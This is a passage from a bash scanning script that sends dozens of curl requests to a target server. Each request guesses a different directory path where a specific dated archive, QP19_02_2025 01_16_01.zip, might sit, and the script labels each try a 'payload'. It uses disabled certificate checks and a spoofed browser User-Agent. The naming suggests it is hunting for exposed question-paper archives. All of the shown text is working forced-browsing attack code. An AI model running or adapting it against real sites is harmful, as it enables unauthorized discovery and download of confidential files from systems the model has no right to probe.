code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
